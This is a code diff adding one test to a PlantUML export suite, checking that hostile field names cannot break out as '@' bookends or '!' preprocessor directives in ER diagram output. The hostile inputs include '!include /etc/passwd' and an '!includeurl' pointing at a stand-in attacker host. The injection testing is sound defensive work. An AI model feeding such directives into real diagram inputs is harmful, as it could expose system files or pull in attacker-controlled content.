@@ -520,6 +520,19 @@ test('x18 model text is escaped for PlantUML: newlines, directives, comments, ma
   assert.match(nodeLines[0].trim(), /^component "[^"]*" as \w+$/, 'the quoted title has no raw quote');
 });
 
+test('x18b a field name that BEGINS with @ or ! cannot become a bookend or a preprocessor directive in the ER output', () => {
+  for (const hostile of ['@enduml', '!include /etc/passwd', '!includeurl http://evil.example/x.puml', '  @startuml']) {
+    const m = clone(model);
+    const ent = m.entities[0];
+    ent.fields[1].name = hostile;
+    const L = lines(toPlantUmlER(m));
+    assert.equal(L[0], '@startuml');
+    assert.equal(L[L.length - 2], '@enduml');
+    assert.equal(L.filter((l) => l.trim().startsWith('@')).length, 2, `only the bookends start with @ for ${hostile}`);
+    for (const l of L) assert.ok(!l.trim().startsWith('!'), `a preprocessor directive for ${hostile}: ${l}`);
+  }
+});
+
 test('x19 PlantUML aliases are safe identifiers without collisions, and file names cannot leave the output dir', () => {
   const m = clone(model);
   const base = m.nodes.find((n) => n.zone === 'zb-web');
